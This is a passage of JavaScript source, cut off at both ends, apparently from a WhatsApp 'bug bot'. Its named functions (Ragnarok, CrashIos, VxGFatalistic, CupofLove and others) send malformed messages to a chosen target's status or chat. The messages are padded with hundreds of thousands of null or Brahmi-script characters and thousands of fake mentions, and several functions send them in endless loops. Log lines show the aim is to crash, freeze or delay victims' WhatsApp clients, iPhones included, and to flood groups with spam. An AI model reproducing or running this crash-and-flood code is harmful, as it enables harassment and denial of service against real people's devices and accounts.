              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "t.me/isi bebas akun kalian",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };
    
    const msg1 = generateWAMessageFromContent(target, content, {});
    const msg2 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});
    
    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
    
    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
    
    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
    console.log(chalk.blue(`sukses send bug Delay ke ${target}`));
  } catch (err) {
    console.error(err);
  }
}

async function Ragnarok(sock, target, mention) {
  try {
    const DelayMsg = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "AMPAS IZIN TAMPIL" + "\u0000".repeat(200000),
            },
            nativeFlowResponseMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "\u0000".repeat(500000) },
                { name: "payment_info", buttonParamsJson: "\u0000".repeat(500000) },
                { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(800000), version: 3 },
              ],
              messageParamsJson: "\u0000".repeat(200000),
            },
          },
          ephemeralExpiration: 0,
          forwardingScore: 0,
          isForwarded: false,
          background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
        },
      },
    };

    // BUNGKUS WA MESSAGE
    const msg = await generateWAMessageFromContent(
      "status@broadcast",
      DelayMsg,
      { userJid: sock.user.id }
    );

    await sock.relayMessage(
      "status@broadcast",
      msg.message,
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      }
    );

    if (mention) {
      const mentionMsg = await generateWAMessageFromContent(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: { remoteJid: target },
                type: 25,
              },
            },
          },
        },
        { userJid: sock.user.id }
      );

      await sock.relayMessage(
        target,
        mentionMsg.message,
        {
          additionalNodes: [
            { tag: "meta", attrs: { is_status_mention: "#DelayHard" } }
          ]
        }
      );
    }

    console.log("✅ DS SENT TO:", target);

  } catch (err) {
    console.error("❌ DS EROR FIX:", err);
  }
}

async function VxGFatalistic(sock, target, mention) {
  const photo = {
    image: VxGCrash,
    caption: "Lixx is heree"
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 666, // ubah ke 100 kalau g ke kirim
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) { // ubah ke 100 / 10 kalau g ke kirim
    const msg = await generateWAMessage(target, photo, {
      upload: sock.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Lixx Cuyy",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
  console.log(chalk.red("ds Success Sending Delay Blank Bug"));
}

async function SpamInvisgb(sock, target) {
  const jid = target.includes("@g.us")
    ? target
    : target.replace(/@.+$/, "@g.us");

  const head = {
    extendedTextMessage: {
      text: "",
      matchedText: "Wa.me/stickerpack/X",
      description: null,
      title: null,
      paymentLinkMetadata: {
        button: { displayText: " X" },
        header: { headerType: 1 },
        provider: { paramsJson: "{{".repeat(10000) },
      },
      linkPreviewMetadata: {
        paymentLinkMetadata: {
          button: { displayText: "X" },
          header: { headerType: 1 },
          provider: { paramsJson: "{{".repeat(10000) },
        },
        urlMetadata: { fbExperimentId: 999 },
        fbExperimentId: 888,
        linkMediaDuration: 555,
        socialMediaPostType: 1221,
      },
    },
  };
  const x = jid.endsWith("@g.us")
    ? head
    : {
        groupStatusMessageV2: {
          message: head,
        },
      };

  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(jid, x, {});

    await sock.relayMessage(jid, msg.message, {
      messageId: msg.key.id,
    });

    await sock.sendMessage(jid, {
      delete: {
        remoteJid: jid,
        fromMe: true,
        id: msg.key.id,
        participant: jid.endsWith("@g.us") ? undefined : jid,
      },
    });
  }
}

async function CupofLove(sock, target, mention = true) {
  const sticker = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: true
    }
  };

  const msgSticker = generateWAMessageFromContent(
    "status@broadcast",
    { ephemeralMessage: { message: sticker, ephemeralExpiration: 259200 } },
    { userJid: sock.user?.id }
  );

  await sock.relayMessage("status@broadcast", msgSticker.message, {
    messageId: msgSticker.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });

  while (true) {
    const image = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/d/f/Z9Y8X7W6V5U4T3S2R1Q0.jpg?ccb=11-4",
        mimetype: "image/jpeg",
        fileSha256: "h8O0mH7mY2H0p0J8m4wq2EoX5J2mP2z9S3oG3y1b2nQ=",
        fileEncSha256: "Vgkq2c2c1m3Y8F0s7f8c3m9V1a2b3c4d5e6f7g8h9i0=",
        mediaKey: "4n0Ck3yVb6b4T2h1u8V7s6Q5p4O3i2K1l0M9n8B7v6A=",
        fileLength: 245781,
        directPath: "",
        mediaKeyTimestamp: "1743225419",
        jpegThumbnail: null,
        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
        scanLengths: [2437, 17332],
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
            )
          ],
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true
        }
      }
    };

    const msg = generateWAMessageFromContent(
      "status@broadcast",
      { ephemeralMessage: { message: { viewOnceMessage: { message: image } }, ephemeralExpiration: 259200 } },
      { userJid: sock.user?.id }
    );

    const interactiveMsg = generateWAMessageFromContent(
      "status@broadcast",
      { 
        ephemeralMessage: { 
          message: { 
            viewOnceMessage: { 
              message: {
                interactiveResponseMessage: {
                  body: { text: "" },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(100000),
                    version: 3
                  }
                }
              }
            } 
          }, 
          ephemeralExpiration: 259200 
        } 
      },
      { userJid: sock.user?.id }
    );

    const paymentMsg = generateWAMessageFromContent(
      "status@broadcast",
      { 
        ephemeralMessage: { 
          message: { 
            viewOnceMessage: { 
              message: {
                interactiveResponseMessage: {
                  body: { text: "" },
                  nativeFlowResponseMessage: {
                    name: "payment_info",
                    paramsJson: "\u0000".repeat(100000),
                    version: 3
                  }
                }
              }
            } 
          }, 
          ephemeralExpiration: 259200 
        } 
      },
      { userJid: sock.user?.id }
    );

    await Promise.all([
      sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }
            ]
          }
        ]
      }),
      sock.relayMessage("status@broadcast", interactiveMsg.message, {
        messageId: interactiveMsg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }
            ]
          }
        ]
      }),
      sock.relayMessage("status@broadcast", paymentMsg.message, {
        messageId: paymentMsg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }
            ]
          }
        ]
      })
    ]);

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "\u0000".repeat(100000) },
              content: undefined
            }
          ]
        }
      );
    }
  }
}

async function CrashIos(target) {
  try {
    const LocX = {
      locationMessage: {
        degreesLatitude: 11.11,
        degreesLongitude: -11.11,
        name: "Testing" + "𑇂𑆵𑆴𑆿".repeat(15000),
        url: "https://t.me/Dxeveryony",
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "0@s.whatsapp.net",
          quotedMessage: {
            callLogMessage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                {
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1",
                },
              ],
            },
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: "X",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZAQABAAD/",
              caption: "𑇂𑆵𑆴𑆿".repeat(15000),
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "CrashIosInvisible",
            },
          },
        },
      },
    };

    await sock.relayMessage("status@broadcast", LocX, {
      messageId: LocX.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    });
  } catch (err) {
    console.error(err);
  }
}

async function Vocabulary(sock, target, mention) {
    let PaymentMsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "|",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "menu_options",
                        paramsJson: "\u0000"
                    },
                    entryPointConversionSource: "galaxy_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9999,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
    });

    await sock.relayMessage("status@broadcast", PaymentMsg.message, {
        messageId: PaymentMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });

    if (PaymentMsg) {
        await sock.relayMessage(target, {
            groupStatusMentionMessageV2: {
                message: {
                    protocolMessage: {
                        key: PaymentMsg.key,
                        type: 25
                    }
                }
            }
        }, {});
    }

    let menuOption = {
        eventMessage: {
            contextInfo: {}, 
            isCanceled: false, 
            name: " |", 
            description: " menu", 
            location: {
                degreesLongitude: 0,
                degreesLatitude: 0
            }, 
            joinLink: "https://whatsapp.call/voice/menuOptionGroup", 
            startTime: Date.now(), 
            endTime: Date.now() * 250208,
            extraGuestAllowed: true, 
            isSchuleCall: true
        }
    };
  
    await sock.relayMessage(target, menuOption, {
        participant: { jid: target }
    });
}

async function DelayInsible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Isi sendiri",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
            entryPointConversionSource: "groupStatusMessage"
          }
        }
      }
    }
  },
  {
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [
          { tag: "to", attrs: { jid: target }, content: undefined }
        ]
      }]
    }]
  });

  await sleep(200);

  if (msg) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
          },
        },
      },
    }, {});
  }
}

async function ephemeralStcInvis(sock, target, mention = true) {
  const sticker = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: true
    }
  };

  const msgSticker = generateWAMessageFromContent(
    "status@broadcast",
    { ephemeralMessage: { message: sticker, ephemeralExpiration: 259200 } },
    { userJid: sock.user?.id }
  );

  await sock.relayMessage("status@broadcast", msgSticker.message, {
    messageId: msgSticker.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });

  while (true) {
    const image = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/d/f/Z9Y8X7W6V5U4T3S2R1Q0.jpg?ccb=11-4",
        mimetype: "image/jpeg",
        fileSha256: "h8O0mH7mY2H0p0J8m4wq2EoX5J2mP2z9S3oG3y1b2nQ=",
        fileEncSha256: "Vgkq2c2c1m3Y8F0s7f8c3m9V1a2b3c4d5e6f7g8h9i0=",
        mediaKey: "4n0Ck3yVb6b4T2h1u8V7s6Q5p4O3i2K1l0M9n8B7v6A=",
        fileLength: 245781,
        directPath: "",
        mediaKeyTimestamp: "1743225419",
        jpegThumbnail: null,
        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
        scanLengths: [2437, 17332],
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
            )
          ],
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true
        }
      }
    };

    const msg = generateWAMessageFromContent(
      "status@broadcast",
      { ephemeralMessage: { message: { viewOnceMessage: { message: image } }, ephemeralExpiration: 259200 } },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "\u0000".repeat(50000) },
              content: undefined
            }
          ]
        }
      );
    }
  }
}

async function Family(sock, target) {
  try {
    const msgContent = proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          lottieStickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
            fileSha256: Buffer.from("ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=", "base64"),
            fileEncSha256: Buffer.from("D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=", "base64"),
            mediaKey: Buffer.from("yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=", "base64"),
            mimetype: "application/was",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
            fileLength: "14390",
            mediaKeyTimestamp: "1760786856",
            isAnimated: true,
            stickerSentTs: "1760786855983",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            stickerType: 2, 
            contextInfo: {
              isForwarded: false,
              mentionedJid: []
            }
          }
        }
      }
    });

    const msg = generateWAMessageFromContent(target, msgContent, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    console.log("PHOENIX INVICTUS SEND BUG ");
  } catch (e) {
    console.error("❌ Function Eror:", e);
  }
}

async function ephemeralStcDelay(sock, target, mention = true) {
  const sticker = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: true
    }
  };

    const msgSticker = generateWAMessageFromContent(
      target,
      { ephemeralMessage: { message: sticker, ephemeralExpiration: 86400 } },
      { userJid: sock.user?.id }
    );
    await sock.relayMessage(target, msgSticker.message, { messageId: msgSticker.key.id });

  while (true) {
    const image = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/d/f/Z9Y8X7W6V5U4T3S2R1Q0.jpg?ccb=11-4",
        mimetype: "image/jpeg",
        fileSha256: "h8O0mH7mY2H0p0J8m4wq2EoX5J2mP2z9S3oG3y1b2nQ=",
        fileEncSha256: "Vgkq2c2c1m3Y8F0s7f8c3m9V1a2b3c4d5e6f7g8h9i0=",
        mediaKey: "4n0Ck3yVb6b4T2h1u8V7s6Q5p4O3i2K1l0M9n8B7v6A=",
        fileLength: 245781,
        directPath: "",
        mediaKeyTimestamp: "1743225419",
        jpegThumbnail: null,
        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
        scanLengths: [2437, 17332],
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
            )
          ],
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true
        }
      }
    };

    const msg = generateWAMessageFromContent(
      "status@broadcast",
      { ephemeralMessage: { message: { viewOnceMessage: { message: image } }, ephemeralExpiration: 86400 } },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "\u0000".repeat(50000) },
              content: undefined
            }
          ]
        }
      );
    }
  }

  return { stickerId: msgSticker.key.id, statusId: msg.key.id };
}

async function MediaInvis(target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "Awas Air Panas",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "Awas Air Panas",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}



async function TrashLocaIos(sock, target) {
  const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿";
  
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: slash,
         name: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰ𝘅𝗿𝗹.𝛆𝛘󠁀𞥆𝛆 ✩" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰ𝘅𝗿𝗹.𝛆𝛘󠁀𞥆𝛆 ✩" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://xrelly-Iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + TrashIosx, 
      }
      
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
    
  await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
                content: undefined
               }]
            }]
        }]
    });
    await sleep(5000)
 }
 
async function gMine(jid) {
  await client.sendMessage(jid, {
    text: "ꦽ".repeat(1000),
    mentions: jid,
    contextInfo: {
      mentionedJid: jid,
      isGroupMention: true
    }
  });
}

async function InvisibleIphone(sock, target) {
const LolipopBug = "PERMEN BANG" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
